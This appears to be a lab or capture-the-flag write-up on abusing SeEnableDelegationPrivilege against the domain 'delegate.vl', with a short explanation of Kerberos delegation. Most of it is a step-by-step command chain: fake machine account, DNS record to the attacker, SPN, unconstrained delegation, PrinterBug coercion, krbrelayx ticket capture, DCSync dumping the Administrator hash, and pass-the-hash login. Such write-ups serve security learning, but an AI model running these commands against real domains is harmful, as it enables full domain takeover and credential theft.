

> **`SeEnableDelegationPrivilege`** —  is an extremely sensitive privilege that allows an account to enable Kerberos delegation on other accounts and computers. This privilege should typically only be held by Domain Admins.


## Delegation

#AD_DEFINATION_KERBEROS_DELEGATION

> **Delegation = letting one account act on behalf of another user.**
> Think of it like this: a user hands over a **temporary permission slip** that says _"this service can pretend to be me and do things for me on other systems."_

Imagine you log into a **web server**, and that web server needs to fetch your data from a **database server** on your behalf.

- You logged into the **web server**, not the database.
- But the web server needs to talk to the database **as you** (with your permissions).

So the web server account is set up to **delegate** — meaning it's trusted to **forward your identity** to the database. The database sees "you," not the web server.

That "trusted to forward your identity" setting = **delegation on that account.**

It's a **legitimate feature** for multi-tier apps. Attackers just abuse it.


___

Here’s the high-level strategy: if the attacker can create a fake computer that has unconstrained delegation enabled, and then trick the Domain Controller into authenticating to that fake computer, they’ll capture the Domain Controller’s TGT. With the DC’s TGT, they can impersonate the DC and perform a DCSync attack to dump all password hashes.


## **Step 1: Creating a Machine Account**

> You need _something_ for the DC to authenticate to. You don't own a real machine in the domain, so you **create a fake one**. This is your trap's body.  
 _Why:_ you need a computer account you fully control.

before creating a machine account make sure that we need to make sure if machine quota isn’t 0

```bash
nxc ldap <DC_IP> -u $USER -p '$PASS' -M maq
```


![[Pasted image 20260915143321.png]]

First creating a machine account with `addcomputer.py`

```bash
addcomputer.py -computer-name bsec -computer-pass 'BehindSecurity@2025' -dc-ip $DC_IP $DOMAIN/$USER:'$PASS'
```

## **Step 2: Adding the DNS Record**

> Your fake computer has a name (`bsec.delegate.vl`), but the DC doesn't know what IP that name points to. You add a DNS record so the name points to **your attacking machine**.  
 _Why:_ when the DC tries to connect to `bsec`, it needs to actually reach **you**. No DNS  DC can't find you.

```bash
python3 dnstool.py -u 'delegate.vl\bsec$' -p '$PASS' --action add --record bsec.delegate.vl --data $ATTACKER_IP --type A -dns-ip $VICTIM_IP dc1.delegate.vl
```

## **Step 3: Adding a Service Principal Name (SPN)**

> Kerberos only works with services that have a **name tag** (SPN). You add `cifs/bsec.delegate.vl` so the fake computer looks like it's running the SMB file-sharing service.  
 _Why:_ without an SPN, Kerberos won't issue tickets _to_ your fake computer. This makes it a valid Kerberos target.

```bash
python3 addspn.py -u '$DOMAIN\$USER' -p '$PASS' -s 'cifs/bsec.delegate.vl' -t 'bsec$' -dc-ip $DC_IP dc1.delegate.vl --additional
```

And then

```bash
python3 addspn.py -u '$DOMAIN\$USER' -p '$PASS' -s 'cifs/bsec.delegate.vl' -t 'bsec$' -dc-ip $DC_IP dc1.delegate.vl
```

## **Step 4: Enabling Unconstrained Delegation**

> This flips the special flag that makes your fake computer a **ticket trap**. With this ON, whenever anyone authenticates to `bsec$`, their **full TGT gets cached** on it.  
 _Why:_ this is the whole point — it's what makes the DC's ticket get **stuck** in your trap. **This step is only possible because N.Thompson has `SeEnableDelegationPrivilege`.**


```bash
bloodyAD -d delegate.vl -u $USER -p $PASS --host dc1.delegate.vl add uac 'bsec$' -f TRUSTED_FOR_DELEGATION
```


## **Step 5: Setting Up the Relay**

> Your trap is built. Now you sit and **wait/listen** for the DC to show up, ready to grab the ticket the moment it arrives.  
   _Why:_ something has to actually catch and save the incoming ticket.

I started krbrelayx, passing the ntlm hash:

```bash
python3 krbrelayx.py -hashes :B4B83CF8C09D86ED23D20B9BDCD9AF26
```



## **Step 6: Coercing Authentication**

> The DC won't just randomly connect to your fake computer. So you **force it** — PrinterBug tricks the DC's printer service into connecting back to `bsec`.  
 _Why:_ you need to **make the DC walk into the trap.** It won't come on its own.



```bash
nxc smb dc1.delegate.vl -u 'bsec$' -p $PASS -M coerce_plus -o LISTENER=bsec.delegate.vl METHOD=PrinterBug
```

## **Step 7: Capturing the TGT**

When the DC authenticated, krbrelayx captured the DC’s TGT and saved it to a file. This TGT is like having temporary credentials for the DC’s machine account:

## **Step 8: DCSync Attack**

> Using the DC's captured ticket, you **pretend to be the DC** and ask the domain to "replicate" all password hashes (DCs are allowed to do this to each other). You get **every hash, including Administrator's**.  
 _Why:_ now you have the keys to the whole domain.

First, export ticket to correct variable:

```bash
export KRB5CCNAME=./DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

And perform DCSYNC:

```bash
secretsdump.py -k dc1.delegate.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

# [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
```

### **Step 9 — Log in as Administrator**

Log in as Administrator via winrm:

```bash
evil-winrm -i dc1 -u $USER -H c32198ceab4cc695e65045562aa3ee93
```